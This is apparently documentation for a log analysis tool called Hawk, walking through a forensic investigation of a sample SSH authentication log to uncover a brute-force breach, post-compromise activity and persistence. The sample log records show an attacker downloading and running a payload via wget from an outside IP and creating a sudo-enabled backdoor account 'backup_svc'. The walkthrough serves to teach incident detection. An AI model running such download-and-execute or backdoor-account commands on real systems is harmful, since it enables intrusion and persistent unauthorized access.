# Walkthrough — Finding a Compromise in SSH Auth Logs

This walkthrough uses `sample_logs/auth.csv`, which ships with the repository. The file contains 182 SSH authentication records from a single server over a morning of activity. Somewhere in there, an attacker brute-forces the server, compromises an account, and establishes persistence. We don't know any of that yet.

The point of this walkthrough is to show how Hawk supports iterative investigation — refining hypotheses, composing filters, and producing evidence — without scripts or queries.

## Loading the file

```text
$ hawk sample_logs/auth.csv
Analysis results:
  Detected delimiter: ','
  Inferred 7 column(s) from first record
  First row looks like a header
  Detected quoted fields (quote char: '"')

Current configuration:
  Delimiter: ','
  Header:    Yes

Accept this configuration? [Y/n]: y
                          _
      /\  /\__ ___      _| | __
     / /_/ / _` \ \ /\ / / |/ /
    / __  / (_| |\ V  V /|   <
    \/ /_/ \__,_| \_/\_/ |_|\_\

Hawk Log Analyzer v0.6.8 (3132c38)
Type 'help' for available commands, 'quit' to exit.
```

Hawk shows what it inferred from the file and asks you to confirm. Type `y` (or press Enter) to accept and continue. Hawk is now ready for commands.

## Orientation

Always start by looking at the shape of the data.

```text
hawk> count
```

```text
Count: 182
```

```text
hawk> columns
```

```text
$col1   timestamp    (datetime, YYYY-MM-DD hh:mm:ss.f+)
$col2   source_ip    (string)
$col3   username     (string)
$col4   auth_method  (string)
$col5   result       (string)
$col6   message      (string)
$col7   port         (integer)
```

182 records, seven columns. The `timestamp` column was inferred as a real datetime, not just a string — that matters later, because Hawk will compare and sort it as a time value rather than lexically.

```text
hawk> head 3
```

```text
  ┐ [$col1]------------ [$col2]-- [$col3]- [$col4]---- [$col5]- [$col6]------------- [$col7]-
# │ timestamp           source_ip username auth_method result   message              port
  ┤ ------------------- --------- -------- ----------- -------- -------------------- --------
1 │ 2026-01-29 09:00:00 10.0.1.42 alice    publickey   SUCCESS  Accepted publickey   64299
2 │ 2026-01-29 09:00:43 10.0.1.87 alice    publickey   SUCCESS  Accepted publickey   62174
3 │ 2026-01-29 09:02:07 10.0.1.42 dave     publickey   SUCCESS  Accepted publickey   41041
```

```text
hawk> tail 3
```

```text
    ┐ [$col1]------------ [$col2]--- [$col3]- [$col4]---- [$col5]- [$col6]------------- [$col7]-
  # │ timestamp           source_ip  username auth_method result   message              port
    ┤ ------------------- ---------- -------- ----------- -------- -------------------- --------
180 │ 2026-01-29 11:17:28 10.0.2.103 bob      publickey   SUCCESS  Accepted publickey   62629
181 │ 2026-01-29 11:19:19 10.0.2.103 dave     publickey   SUCCESS  Accepted publickey   40565
182 │ 2026-01-29 11:20:07 10.0.2.103 bob      publickey   SUCCESS  Accepted publickey   50033
```

Looks like ordinary internal traffic from a `10.0.x.x` network — `publickey` auth, `SUCCESS` results. But the head and tail of a log say almost nothing about what's in the middle.

## Hunting for outliers

Forensic work usually starts with cardinality. Distinct values surface anomalies fast.

```text
hawk> distinct result
```

```text
Found 2 distinct values for 'result' (182 total rows):

  Value     Count
  --------  -----
  SUCCESS      93
  FAILURE      89
```

Nearly half the auth attempts failed. That ratio is wrong for a healthy server.

```text
hawk> distinct source_ip
```

```text
Found 6 distinct values for 'source_ip' (182 total rows):

  Value           Count
  --------------  -----
  185.220.101.47     93
  10.0.2.103         24
  10.0.1.87          22
  10.0.2.15          21
  10.0.1.42          20
  91.219.236.222      2
```

Two non-internal IPs stand out among the `10.0.x.x` range. `185.220.101.47` accounts for over half the traffic by itself. `91.219.236.222` shows up only twice — suspicious in a different way.

## Confirming the brute-force pattern

Narrow to failures only and see who's responsible.

```text
hawk> filter result == "FAILURE"
hawk> distinct source_ip
```

```text
Found 3 distinct values for 'source_ip' (89 total rows):

  Value           Count
  --------------  -----
  185.220.101.47     85
  10.0.1.87           2
  10.0.2.103          2
```

```text
hawk> distinct username
```

```text
Found 10 distinct values for 'username' (89 total rows):

  Value     Count
  --------  -----
  admin        15
  test         13
  postgres     11
  root         11
  ubuntu       11
  oracle        8
  deploy        8
  git           8
  dave          3
  alice         1
```

`185.220.101.47` accounts for 85 of the 89 failures. The targeted usernames are a classic brute-force wordlist — `admin`, `test`, `postgres`, `root`, `ubuntu`, `oracle`, `deploy`, `git` — with a couple of scattered internal users (`dave`, `alice`) mixed in as probable typos.

## Looking at what the attacker did

Reset the filter and pivot to everything that IP did, including any successes.

```text
hawk> reset --view
hawk> filter source_ip == "185.220.101.47"
hawk> distinct result
```

```text
Found 2 distinct values for 'result' (93 total rows):

  Value     Count
  --------  -----
  FAILURE      85
  SUCCESS       8
```

85 failures and 8 successes. That's worse than expected — not just a single breach but several successful actions from the attacker IP.

```text
hawk> filter result == "SUCCESS"
hawk> peek 1
```

```text
      Record #128
---------------------------------
 timestamp   2026-01-29 10:26:37
 source_ip   185.220.101.47
 username    root
 auth_method password
 result      SUCCESS
 message     Accepted password
 port        35557
```

The first success: `root`, password auth, immediately after the wave of failures. That's the breach. The other 7 successes are everything the attacker did *after* getting in — Hawk shows them all in file order, so `peek 1` lands on the chronologically first one.

## Post-compromise activity

Narrow the projection to just the columns that matter, sort by time, and look at the full picture.

```text
hawk> select timestamp, username, message
hawk> sort timestamp
hawk> head 8
```

```text
    ┐ [$col1]------------ [$col3]- [$col6]-------------------------------------------------
  # │ timestamp           username message
    ┤ ------------------- -------- --------------------------------------------------------
128 │ 2026-01-29 10:26:37 root     Accepted password
129 │ 2026-01-29 10:26:40 root     session opened for user root
130 │ 2026-01-29 10:27:01 root     COMMAND=/usr/bin/wget http://185.220.101.47/payload.sh
131 │ 2026-01-29 10:27:08 root     COMMAND=/bin/chmod +x /tmp/payload.sh
132 │ 2026-01-29 10:27:22 root     COMMAND=/tmp/payload.sh
133 │ 2026-01-29 10:27:33 root     COMMAND=/usr/sbin/useradd -m -s /bin/bash backup_svc
134 │ 2026-01-29 10:27:38 root     COMMAND=/usr/sbin/usermod -aG sudo backup_svc
135 │ 2026-01-29 10:27:50 root     COMMAND=/usr/bin/passwd backup_svc
```

The full pivot. After the breach, the attacker:

1. Opens a sudo session.
2. Downloads a payload from the same IP that brute-forced the server.
3. Makes it executable and runs it.
4. Creates a new user `backup_svc` with sudo privileges and sets its password.

The name `backup_svc` is chosen to blend in with system service accounts.

## Persistence from a second IP

Earlier we noted `91.219.236.222` appeared only twice. Now we know what to look for.

```text
hawk> reset
hawk> filter source_ip == "91.219.236.222"
hawk> select timestamp, username, auth_method, result, message
hawk> head 2
```

```text
    ┐ [$col1]------------ [$col3]--- [$col4]---- [$col5]- [$col6]-----------------------
  # │ timestamp           username   auth_method result   message
    ┤ ------------------- ---------- ----------- -------- ------------------------------
136 │ 2026-01-29 10:28:14 backup_svc password    SUCCESS  Accepted password
137 │ 2026-01-29 10:28:26 backup_svc sudo        SUCCESS  session opened for user root
```

The attacker, having created `backup_svc` and set its password, logs in from a different IP minutes later — persistence established. Two attacker IPs, two foothold accounts, full compromise.

## Preserving evidence

Reset, filter to both attacker IPs, sort chronologically, and export.

```text
hawk> reset
hawk> filter source_ip == "185.220.101.47"
hawk> filter+ source_ip == "91.219.236.222"
hawk> sort timestamp
hawk> export incident_2026-01-29.csv
```

```text
Exported 95 records to incident_2026-01-29.csv
```

The exported file contains every record touched by the attacker IPs, sorted chronologically. It is a verbatim subset of the original log — Hawk does not rewrite, normalize, or annotate the source data.

## Replay

Every command in the session is captured. Save the investigation as a replayable script:

```text
hawk> history --save investigation.hawk
```

```text
Saved 26 commands to investigation.hawk
```

Anyone — or you, six months later — can replay the investigation against the same source file and reproduce these findings exactly. That is what reproducibility means in practice.

The complete command sequence is preserved as `sample_logs/walkthrough.hawk`. Replay the investigation against the sample log:

```text
hawk sample_logs/auth.csv --delimiter ',' --header < sample_logs/walkthrough.hawk
```

The `--delimiter` and `--header` flags declare the file format explicitly, bypassing inference. This is what a replay script should do — commit to the assumptions the original investigation was run against, rather than depend on inference producing the same result six months later.

## What this exercises

In a handful of commands, the walkthrough touched:

- Schema inference and orientation (`columns`, `count`, `head`, `tail`)
- Cardinality-based outlier hunting (`distinct`)
- Predicate narrowing (`filter`)
- Composition (`filter+`)
- Single-record inspection (`peek`)
- Projection (`select`)
- Stable chronological reconstruction (`sort`)
- Resetting between hypotheses (`reset --view`, `reset`)
- Evidence preservation (`export`)
- Session replay (`history --save`)

No scripts, no queries, no mutations of the source data — just declarative commands producing views over the original file.
